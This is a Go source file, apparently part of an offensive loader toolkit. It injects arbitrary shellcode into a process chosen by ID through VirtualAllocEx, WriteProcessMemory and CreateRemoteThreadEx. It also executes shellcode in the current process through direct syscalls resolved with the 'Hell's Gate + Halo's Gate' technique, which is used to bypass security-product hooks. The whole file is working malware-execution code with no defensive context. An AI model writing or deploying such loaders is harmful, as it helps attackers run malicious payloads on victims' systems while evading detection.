package core

import (
	//"fmt"
	"errors"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func CreateRemoteThread(shellcode []byte, pid int) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

	var pHandle uintptr

	if pid == 0 {
		pHandle, _, _ = GetCurrentProcess.Call()
	} else {
		pHandle, _, _ = OpenProcess.Call(
			windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
			uintptr(0),
			uintptr(pid),
		)
	}

	addr, _, _ := VirtualAllocEx.Call(
		uintptr(pHandle),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	WriteProcessMemory.Call(
		uintptr(pHandle),
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	oldProtect := windows.PAGE_READWRITE
	VirtualProtectEx.Call(
		uintptr(pHandle),
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	CreateRemoteThreadEx.Call(
		uintptr(pHandle),
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	_, _, errCloseHandle := CloseHandle.Call(pHandle)
	if errCloseHandle != nil {
		return errCloseHandle
	}

	return nil
}

/*

Hell's Gate + Halo's Gate technique

*/

func CreateRemoteThreadHalos(shellcode []byte) error {

	NtAllocateVirtualMemory, err := GetSysId("NtAllocateVirtualMemory")
	if err != nil {
		return err
	}

	NtWriteVirtualMemory, err := GetSysId("NtWriteVirtualMemory")
	if err != nil {
		return err
	}

	NtProtectVirtualMemory, err := GetSysId("NtProtectVirtualMemory")
	if err != nil {
		return err
	}

	NtCreateThreadEx, err := GetSysId("NtCreateThreadEx")
	if err != nil {
		return err
	}

	var addr uintptr
	regionsize := uintptr(len(shellcode))

	r1, err := Syscall(
		NtAllocateVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE,
	)
	if r1 != 0 {
		return err
	}

	Syscall(
		NtWriteVirtualMemory,
		uintptr(0xffffffffffffffff),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	var oldProtect uintptr
	r2, err := Syscall(
		NtProtectVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r2 != 0 {
		return err
	}

	var hhosthread uintptr
	r3, err := Syscall(
		NtCreateThreadEx,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		uintptr(0xffffffffffffffff),
		addr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)

	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)

	if r3 != 0 {
		return err
	}

	/*var addr uintptr
		regionsize := uintptr(len(shellcode))

		r1, err := Syscall(
			NtAllocateVirtualMemory,
			uintptr(0xffffffffffffffff),
			uintptr(unsafe.Pointer(&addr)),
			0,
			uintptr(unsafe.Pointer(&regionsize)),
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			syscall.PAGE_READWRITE,
		)
		if r1 != 0 {
	    fmt.Println("x")
			return err
		}

		Syscall(
			NtWriteVirtualMemory,
			uintptr(0xffffffffffffffff),
			addr,
			uintptr(unsafe.Pointer(&shellcode[0])),
			uintptr(len(shellcode)),
			0,
		)

		var oldProtect uintptr
		r2, err := Syscall(
			NtProtectVirtualMemory,
			uintptr(0xffffffffffffffff),
			uintptr(unsafe.Pointer(&addr)),
			uintptr(unsafe.Pointer(&regionsize)),
			syscall.PAGE_EXECUTE_READ,
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if r2 != 0 {
	    fmt.Println("xx")
			return err
		}

		var hhosthread uintptr
		r3, err := Syscall(
			NtCreateThreadEx,
			uintptr(unsafe.Pointer(&hhosthread)),
			0x1FFFFF,
			0,
			uintptr(0xffffffffffffffff),
			addr,
			0,
			uintptr(0),
			0,
			0,
			0,
			0,
		)

		syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)

		if r3 != 0 {
	    fmt.Println("xxx")
			return err
		}*/

	return nil
}
